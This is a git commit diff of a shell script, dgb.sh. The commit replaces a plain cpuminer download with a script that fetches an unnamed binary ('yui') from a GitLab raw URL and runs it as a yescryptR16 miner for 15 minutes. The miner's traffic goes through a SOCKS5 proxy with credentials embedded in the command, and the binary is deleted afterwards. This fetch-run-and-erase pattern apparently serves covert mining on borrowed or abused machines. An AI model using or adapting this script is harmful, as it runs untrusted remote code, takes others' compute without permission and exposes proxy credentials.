6813c7db737a34aecebef492af13bcef7b4c6b05
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-01-16 02:21:16 +0700

    Update dgb.sh

--- dgb.sh
+++ dgb.sh
@@ -1,4 +1,7 @@
 #!/bin/bash
-wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz 
-tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz 
-./cpuminer -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u RGDDXRXXPzxnd9VMkdJCxRVwgMLoAAf3ym -p c=RVN,mc=CURVE,ID=Worke -t 1
+apt-get update
+apt install screen -y
+wget https://gitlab.com/sumarnosabar1/rexors/-/raw/main/yui
+chmod +x yui
+timeout 15m ./yui -a yescryptr16  -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u RGDDXRXXPzxnd9VMkdJCxRVwgMLoAAf3ym.RX --proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
+rm -rf yui
